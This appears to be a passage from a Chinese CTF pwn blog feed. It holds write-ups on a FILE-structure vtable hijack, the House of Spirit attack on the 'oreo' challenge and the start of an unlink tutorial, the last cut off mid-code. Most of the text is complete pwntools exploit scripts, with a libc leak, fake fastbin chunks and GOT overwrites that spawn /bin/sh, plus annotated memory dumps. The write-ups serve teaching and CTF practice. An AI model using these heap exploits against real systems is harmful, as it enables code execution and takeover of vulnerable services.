&lt;_IO_stdfile_1_lock&gt;, </span><br><span class="line">    _offset = -1, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x7ffff7dd17a0 &lt;_IO_wide_data_1&gt;, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 0, </span><br><span class="line">    _mode = -1, </span><br><span class="line">    _unused2 = &apos;\000&apos; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x7ffff7dd06e0 &lt;_IO_file_jumps&gt;      &lt;---------将要被修改指向system(&apos;/bin/sh&apos;)函数的虚表指针</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个确实是知识点不足，对_IO_FILE比较陌生。</p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level=&apos;debug&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh = process(&apos;./blind&apos;)</span><br><span class="line">elf = ELF(&apos;./libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">def new(idx,content):</span><br><span class="line">    sh.sendline(&apos;1&apos;)</span><br><span class="line">    sh.recvuntil(&apos;Index:&apos;)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(&apos;Content:&apos;)</span><br><span class="line">    sh.send(content)</span><br><span class="line">    sh.recvuntil(&apos;Choice:&apos;)</span><br><span class="line"></span><br><span class="line">def change(idx,content):</span><br><span class="line">    sh.sendline(&apos;2&apos;)</span><br><span class="line">    sh.recvuntil(&apos;Index:&apos;)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(&apos;Content:&apos;)</span><br><span class="line">    sh.send(content)</span><br><span class="line">    sh.recv()</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">    sh.sendline(&apos;3&apos;)</span><br><span class="line">    sh.recvuntil(&apos;Index:&apos;)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(&apos;Choice:&apos;)</span><br><span class="line"></span><br><span class="line">system_addr =  0x4008E3</span><br><span class="line"></span><br><span class="line">new(0,&apos;a\n&apos;)</span><br><span class="line">new(1,&apos;b\n&apos;)</span><br><span class="line">delete(0)</span><br><span class="line">change(0,p64(0x60203d)+&apos;\n&apos;)     &lt;-------直接利用UAF漏洞伪造fastbin，相对于释放两个再伪造方便了不少</span><br><span class="line"></span><br><span class="line">gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*0x13 + p64(0x602020)+p64(0x602090)+ p64(0x602090+0x68)+ p64(0x602090+0x68*2) + p64(0x602090+0x68*3)+&apos;\n&apos;</span><br><span class="line">new(2,&apos;a\n&apos;)</span><br><span class="line">new(3,payload)     &lt;-------------伪造的chunk 再用来修改存储chunk指针的地方，后面malloc的事直接省了，还不用考虑过malloc(fastbin)的检查</span><br><span class="line"></span><br><span class="line">gdb.attach(sh)</span><br><span class="line">fake_struct = p64(0x00000000fbad8000) + p64(0x602060)*7 + p64(0x602061) + p64(0)*4  </span><br><span class="line">fake_struct +=  p64(0x602060) + p64(0x1)  + p64(0xffffffffffffffff) + p64(0)</span><br><span class="line">fake_struct += p64(0x602060) + p64(0xffffffffffffffff) + p64(0) + p64(0x602060) </span><br><span class="line">fake_struct +=  p64(0)*3 + p64(0x00000000ffffffff) + p64(0)*2 +  p64(0x602090 + 0x68*3)</span><br><span class="line">fake_vtable = p64(system_addr)*10</span><br><span class="line"></span><br><span class="line">change(1,fake_struct[:0x68])</span><br><span class="line">change(2,fake_struct[0x68:0xd0])</span><br><span class="line">change(3,fake_struct[0xd0:]+&apos;\n&apos;)</span><br><span class="line">change(4,fake_vtable+&apos;\n&apos;)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">x/100gx 0x602020</span><br><span class="line">0x602020 &lt;stdout&gt;:0x00007f8bb5dde6200x0000000000000000  </span><br><span class="line">0x602030 &lt;stdin&gt;:0x00007f8bb5ddd8e00x0000000000000000</span><br><span class="line">0x602040 &lt;stderr&gt;:0x00007f8bb5dde5400x6161610000000000</span><br><span class="line">0x602050:0x61616161616161610x6161616161616161</span><br><span class="line">0x602060:0x00000000006020200x0000000000602090</span><br><span class="line">0x602070:0x00000000006020f80x0000000000602160      &lt;-----伪造的一堆chunk指针</span><br><span class="line">0x602080:0x00000000006021c80x0000000000000000</span><br><span class="line"></span><br><span class="line">0x602090:0x00000000fbad80000x0000000000602060      &lt;-----fake_struct 开始</span><br><span class="line">0x6020a0:0x00000000006020600x0000000000602060</span><br><span class="line">0x6020b0:0x00000000006020600x0000000000602060</span><br><span class="line">0x6020c0:0x00000000006020600x0000000000602060</span><br><span class="line">0x6020d0:0x00000000006020610x0000000000000000</span><br><span class="line">0x6020e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020f0:0x00000000000000000x0000000000602060</span><br><span class="line">0x602100:0x00000000000000010xffffffffffffffff</span><br><span class="line">0x602110:0x00000000000000000x0000000000602060</span><br><span class="line">0x602120:0xffffffffffffffff0x0000000000000000</span><br><span class="line">0x602130:0x00000000006020600x0000000000000000</span><br><span class="line">0x602140:0x00000000000000000x0000000000000000</span><br><span class="line">0x602150:0x00000000ffffffff0x0000000000000000</span><br><span class="line">0x602160:0x00000000000000000x00000000006021c8     &lt;----vtable指针指向存放system(&apos;/bin/sh&apos;)函数的地址</span><br><span class="line">0x602170:0x00000000000000000x0000000000000000</span><br><span class="line">0x602180:0x00000000000000000x0000000000000000</span><br><span class="line">0x602190:0x00000000000000000x0000000000000000</span><br><span class="line">0x6021a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6021b0:0x00000000000000000x0000000000000000</span><br><span class="line"></span><br><span class="line">0x6021c0:0x00000000000000000x00000000004008e3      &lt;-----存放了一堆system(&apos;/bin/sh&apos;)函数的地址，便于命中</span><br><span class="line">0x6021d0:0x00000000004008e30x00000000004008e3</span><br><span class="line">0x6021e0:0x00000000004008e30x00000000004008e3</span><br><span class="line">0x6021f0:0x00000000004008e30x00000000004008e3</span><br><span class="line">0x602200:0x00000000004008e30x00000000004008e3</span><br><span class="line">0x602210:0x00000000004008e30x0000000000000000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">change(0,p64(0x602090)+&apos;\n&apos;)                          &lt;------修改stdout指针，稳了</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> stack </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Introduction to pwn2.5-HouseOfSpirit</title>
      <link href="/2018/12/23/introduction-to-pwn2-5-houseofspirit/"/>
      <url>/2018/12/23/introduction-to-pwn2-5-houseofspirit/</url>
      <content type="html"><![CDATA[<h1 id="House-of-Spirit-原理"><a href="#House-of-Spirit-原理" class="headerlink" title="House of Spirit 原理"></a>House of Spirit 原理</h1><p>终于正式步入了houseof系列！！</p><p>house of spirit 其实也属于fastbin attack。简单来讲就是伪造一个chunk，不论这个chunk在什么位置，使之能够满足被free的条件，之后再将其malloc出来，因为malloc到了一个我们可控的区域，就有希望继续为所欲为。</p><p>依旧heap-explotation举例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">struct fast_chunk &#123;</span><br><span class="line">  size_t prev_size;</span><br><span class="line">  size_t size;</span><br><span class="line">  struct fast_chunk *fd;</span><br><span class="line">  struct fast_chunk *bk;</span><br><span class="line">  char buf[0x20];                   // chunk falls in fastbin size range</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct fast_chunk fake_chunks[2];   // Two chunks in consecutive memory</span><br><span class="line">// fake_chunks[0] at 0x7ffe220c5ca0</span><br><span class="line">// fake_chunks[1] at 0x7ffe220c5ce0</span><br><span class="line"></span><br><span class="line">void *ptr, *victim;</span><br><span class="line"></span><br><span class="line">ptr = malloc(0x30);                 // First malloc</span><br><span class="line"></span><br><span class="line">// Passes size check of &quot;free(): invalid size&quot;</span><br><span class="line">fake_chunks[0].size = sizeof(struct fast_chunk);  // 0x40</span><br><span class="line"></span><br><span class="line">// Passes &quot;free(): invalid next size (fast)&quot;</span><br><span class="line">fake_chunks[1].size = sizeof(struct fast_chunk);  // 0x40</span><br><span class="line"></span><br><span class="line">// Attacker overwrites a pointer that is about to be &apos;freed&apos;</span><br><span class="line">ptr = (void *)&amp;fake_chunks[0].fd;</span><br><span class="line"></span><br><span class="line">// fake_chunks[0] gets inserted into fastbin</span><br><span class="line">free(ptr);</span><br><span class="line"></span><br><span class="line">victim = malloc(0x30);              // 0x7ffe220c5cb0 address returned from malloc</span><br></pre></td></tr></table></figure><p>可以看见最后malloc到了fakechunk的位置，之后具体的利用以oreo举例</p><h1 id="oreo"><a href="#oreo" class="headerlink" title="oreo"></a>oreo</h1><h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><p>1.malloc<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">unsigned int add()</span><br><span class="line">&#123;</span><br><span class="line">  rifle *v1; // [esp+18h] [ebp-10h]</span><br><span class="line">  unsigned int v2; // [esp+1Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(0x14u);</span><br><span class="line">  v1 = head;</span><br><span class="line">  head = (rifle *)malloc(0x38u);</span><br><span class="line">  if ( head )</span><br><span class="line">  &#123;</span><br><span class="line">    head-&gt;next = v1;</span><br><span class="line">    printf(&quot;Rifle name: &quot;);</span><br><span class="line">    fgets(head-&gt;name, 0x38, stdin);</span><br><span class="line">    cut_enter(head-&gt;name);</span><br><span class="line">    printf(&quot;Rifle description: &quot;);</span><br><span class="line">    fgets(head-&gt;descript, 0x38, stdin);</span><br><span class="line">    cut_enter(head-&gt;descript);</span><br><span class="line">    ++rifle_cnt;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Something terrible happened!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readgsdword(0x14u) ^ v2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">分析得到的结构体, name及description存在明显的溢出。</span><br><span class="line"></span><br><span class="line">00000000 rifle           struc ; (sizeof=0x38, mappedto_5)</span><br><span class="line">00000000 descript        db 25 dup(?)</span><br><span class="line">00000019 name            db 27 dup(?)</span><br><span class="line">00000034 next            dd ?                    ; offset</span><br><span class="line">00000038 rifle           ends</span><br></pre></td></tr></table></figure></p><p>2.show</p><p>通过i-&gt;next遍历所有的malloc结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">unsigned int show_rifles()</span><br><span class="line">&#123;</span><br><span class="line">  rifle *i; // [esp+14h] [ebp-14h]</span><br><span class="line">  unsigned int v2; // [esp+1Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(0x14u);</span><br><span class="line">  printf(&quot;Rifle to be ordered:\n%s\n&quot;, &quot;===================================&quot;);</span><br><span class="line">  for ( i = head; i; i = i-&gt;next )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Name: %s\n&quot;, i-&gt;name);</span><br><span class="line">    printf(&quot;Description: %s\n&quot;, i);</span><br><span class="line">    puts(&quot;===================================&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readgsdword(0x14u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.message</p><p>给了一块0x80大小的可以写notice的内存，给了我们伪造bypass fakechunk检查的机会</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">unsigned int message()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v0; // ST1C_4</span><br><span class="line"></span><br><span class="line">  v0 = __readgsdword(0x14u);</span><br><span class="line">  printf(&quot;Enter any notice you&apos;d like to submit with your order: &quot;);</span><br><span class="line">  fgets(notice, 0x80, stdin);</span><br><span class="line">  cut_enter(notice);</span><br><span class="line">  return __readgsdword(0x14u) ^ v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>在上面的条件之下，我们便有了机会利用house of spirit 的机会，注意到bss段变量的存放顺序–&gt;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.bss:0804A288 head          </span><br><span class="line">.bss:0804A288                                         </span><br><span class="line">.bss:0804A28C                </span><br><span class="line">.bss:0804A2A0 order_num      </span><br><span class="line">.bss:0804A2A0                                        </span><br><span class="line">.bss:0804A2A4 rifle_cnt      </span><br><span class="line">.bss:0804A2A4                                        </span><br><span class="line">.bss:0804A2A8 ; char *notice</span><br><span class="line">.bss:0804A2A8 notice         </span><br><span class="line">.bss:0804A2A8</span><br></pre></td></tr></table></figure><p>而程序中仅有固定的malloc(0x38)，分配出来的chunk size应该为0x41,我们可以想到，当malloc足够的chunk时，rifle_cnt将可以达到0x40，为了绕过free fastbin的检查我们就需要在notice中伪造nextchunk的pre_size 及size，这个很容易以做到。<br>伪造完成后，因为add中存在对name的溢出，那么如果将其溢出至rifle-&gt;next的位置，填入任一函数的got地址，那么在show时便足以泄露实际地址然后得到system，/bin/sh的地址。之后便将其溢出为fakechunk处，为之后的free做好准备。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.terminal = [&apos;gnome-terminal&apos;, &apos;-x&apos;, &apos;sh&apos;, &apos;-c&apos;]</span><br><span class="line">if args[&apos;DEBUG&apos;]:</span><br><span class="line">    context.log_level = &apos;debug&apos;</span><br><span class="line">context.binary = &quot;./oreo&quot;</span><br><span class="line">oreo = ELF(&quot;./oreo&quot;)</span><br><span class="line">if args[&apos;REMOTE&apos;]:</span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">else:</span><br><span class="line">    p = process(&quot;./oreo&quot;)</span><br><span class="line">log.info(&apos;PID: &apos; + str(proc.pidof(p)[0]))</span><br><span class="line">libc = ELF(&apos;./libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(descrip, name):</span><br><span class="line">    p.sendline(&apos;1&apos;)</span><br><span class="line">    #p.recvuntil(&apos;Rifle name: &apos;)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    #p.recvuntil(&apos;Rifle description: &apos;)</span><br><span class="line">    #sleep(0.5)</span><br><span class="line">    p.sendline(descrip)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def show_rifle():</span><br><span class="line">    p.sendline(&apos;2&apos;)</span><br><span class="line">    p.recvuntil(&apos;===================================\n&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def order():</span><br><span class="line">    p.sendline(&apos;3&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def message(notice):</span><br><span class="line">    p.sendline(&apos;4&apos;)</span><br><span class="line">    #p.recvuntil(&quot;Enter any notice you&apos;d like to submit with your order: &quot;)</span><br><span class="line">    p.sendline(notice)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    print &apos;step 1. leak libc base&apos;</span><br><span class="line">    name = 27 * &apos;a&apos; + p32(oreo.got[&apos;puts&apos;])</span><br><span class="line">    add(25 * &apos;a&apos;, name)</span><br><span class="line">    show_rifle()</span><br><span class="line">    p.recvuntil(&apos;===================================\n&apos;)</span><br><span class="line">    p.recvuntil(&apos;Description: &apos;)</span><br><span class="line">    puts_addr = u32(p.recvuntil(&apos;\n&apos;, drop=True)[:4])</span><br><span class="line">    log.success(&apos;puts addr: &apos; + hex(puts_addr))</span><br><span class="line">    libc_base = puts_addr - libc.symbols[&apos;puts&apos;]</span><br><span class="line">    system_addr = libc_base + libc.symbols[&apos;system&apos;]</span><br><span class="line">    binsh_addr = libc_base + next(libc.search(&apos;/bin/sh&apos;))</span><br><span class="line">    print &quot;binsh_addr: &quot; + hex(binsh_addr)</span><br><span class="line">    print &apos;step 2. free fake chunk at 0x0804A2A8&apos;</span><br><span class="line"></span><br><span class="line">    # now, oifle_cnt=1, we need set it = 0x40</span><br><span class="line">    oifle = 1</span><br><span class="line">    while oifle &lt; 0x3f:</span><br><span class="line">        # set next link=NULL</span><br><span class="line">        add(25 * &apos;a&apos;, &apos;a&apos; * 27 + p32(0))</span><br><span class="line">        oifle += 1</span><br><span class="line">    payload = &apos;a&apos; * 27 + p32(0x0804a2a8)</span><br><span class="line">    # set next link=0x0804A2A8, try to free a fake chunk</span><br><span class="line">    add(25 * &apos;a&apos;, payload)</span><br><span class="line">    # before free, we need to bypass some check</span><br><span class="line">    # fake chunk&apos;s size is 0x40</span><br><span class="line">    # 0x20 *&apos;a&apos; for padding the last fake chunk</span><br><span class="line">    # 0x40 for fake chunk&apos;s next chunk&apos;s prev_size</span><br><span class="line">    # 0x100 for fake chunk&apos;s next chunk&apos;s size</span><br><span class="line">    # set fake iofle&apos; next to be NULL</span><br><span class="line">    payload = 0x20 * &apos;\x00&apos; + p32(0x40) + p32(0x100)</span><br><span class="line">    payload = payload.ljust(52, &apos;b&apos;)</span><br><span class="line">    payload += p32(0)</span><br><span class="line">    payload = payload.ljust(128, &apos;c&apos;)</span><br><span class="line">    message(payload)</span><br><span class="line">    # fastbin 0x40: 0x0804A2A0-&gt;some where heap-&gt;NULL</span><br><span class="line">    order()</span><br><span class="line">    p.recvuntil(&apos;Okay order submitted!\n&apos;)</span><br><span class="line"></span><br><span class="line">    print &apos;step 3. get shell&apos;</span><br><span class="line">    # modify strlen@got to system addr                   // don&apos;t know why modified free@got addr could&apos;t get shell</span><br><span class="line">    payload = p32(oreo.got[&apos;strlen&apos;]).ljust(20, &apos;a&apos;)</span><br><span class="line">    add(payload, &apos;b&apos; * 20)</span><br><span class="line">    log.success(&apos;system addr: &apos; + hex(system_addr))</span><br><span class="line">    #gdb.attach(p)</span><br><span class="line">    message(p32(system_addr) + &apos;;/bin/sh\x00&apos;) </span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Introduction to pwn2.4-unlink</title>
      <link href="/2018/12/20/introduction-to-pwn2-4-unlink/"/>
      <url>/2018/12/20/introduction-to-pwn2-4-unlink/</url>
      <content type="html"><![CDATA[<p>之前看了好久的unlink，现在回来再看一下，顺便写个笔记</p><h1 id="unlink-原理"><a href="#unlink-原理" class="headerlink" title="unlink 原理"></a>unlink 原理</h1><p>  当创建几个满足smallbin大小的块时，如果有可能使数据溢出，那么在中间的一个chunk中可以伪造一个fakechunk，同时溢出至下一个chunk的头部，伪造pre_size为fakechunk的size，修改size处的标志位，使之认为前一个chunk为空。<br>  那么在free nextchunk(chunk2)时，因为unlink的机制，会先检查前一块chunk1是否为空，如果通过检验，那么便会将其卸下，之后再检查nextnextchunk(chunk3)，发现正在使用，则执行unlink</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line">FD=P-&gt;fd</span><br><span class="line">BK=P-&gt;bk </span><br><span class="line">FD-&gt;bk = BK</span><br><span class="line">BK-&gt;fd = FD</span><br></pre></td></tr></table></figure><p>  这样的操作在正常情况下会将空闲chunk卸下，但是在这样的伪造情况下，chunk1中的fakechunk便会进入chunklist。而在前面绕过unlink检查时，我们修改了fd与bk指针，使得P-&gt;FD-&gt;BK = P, P-&gt;BK-&gt;FD = P；为了能够得到对指针的控制，我们倾向于将其指向chunk1的指针所放置的内存之上，之后再修改chunk1的内容，实质上便是在修改自己的指针放置的位置及之后的指针，从而修改got表或者malloc_hook或free_hook之类的达到get_shell的目的。</p><p>使用heap-exploitation的例子来见证一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">struct chunk_structure &#123;</span><br><span class="line">  size_t prev_size;</span><br><span class="line">  size_t size;</span><br><span class="line">  struct chunk_structure *fd;</span><br><span class="line">  struct chunk_structure *bk;</span><br><span class="line">  char buf[10];               // padding</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">unsigned long long *chunk1, *chunk2;</span><br><span class="line">struct chunk_structure *fake_chunk, *chunk2_hdr;</span><br><span class="line">char data[20];</span><br><span class="line"></span><br><span class="line">// First grab two chunks (non fast)</span><br><span class="line">chunk1 = malloc(0x80);        // Points to 0xa0e010</span><br><span class="line">chunk2 = malloc(0x80);        // Points to 0xa0e0a0</span><br><span class="line"></span><br><span class="line">// Assuming attacker has control over chunk1&apos;s contents</span><br><span class="line">// Overflow the heap, override chunk2&apos;s header</span><br><span class="line"></span><br><span class="line">// First forge a fake chunk starting at chunk1</span><br><span class="line">// Need to setup fd and bk pointers to pass the unlink security check</span><br><span class="line">fake_chunk = (struct chunk_structure *)chunk1;</span><br><span class="line">fake_chunk-&gt;fd = (struct chunk_structure *)(&amp;chunk1 - 3); // Ensures P-&gt;fd-&gt;bk == P</span><br><span class="line">fake_chunk-&gt;bk = (struct chunk_structure *)(&amp;chunk1 - 2); // Ensures P-&gt;bk-&gt;fd == P</span><br><span class="line"></span><br><span class="line">// Next modify the header of chunk2 to pass all security checks</span><br><span class="line">chunk2_hdr = (struct chunk_structure *)(chunk2 - 2);</span><br><span class="line">chunk2_hdr-&gt;prev_size = 0x80;  // chunk1&apos;s data region size</span><br><span class="line">chunk2_hdr-&gt;size &amp;= ~1;        // Unsetting prev_in_use bit</span><br><span class="line"></span><br><span class="line">// Now, when chunk2 is freed, attacker&apos;s fake chunk is &apos;unlinked&apos;</span><br><span class="line">// This results in chunk1 pointer pointing to chunk1 - 3</span><br><span class="line">// i.e. chunk1[3] now contains chunk1 itself.</span><br><span class="line">// We then make chunk1 point to some victim&apos;s data</span><br><span class="line">free(chunk2);</span><br><span class="line"></span><br><span class="line">chunk1[3] = (unsigned long long)data;</span><br><span class="line"></span><br><span 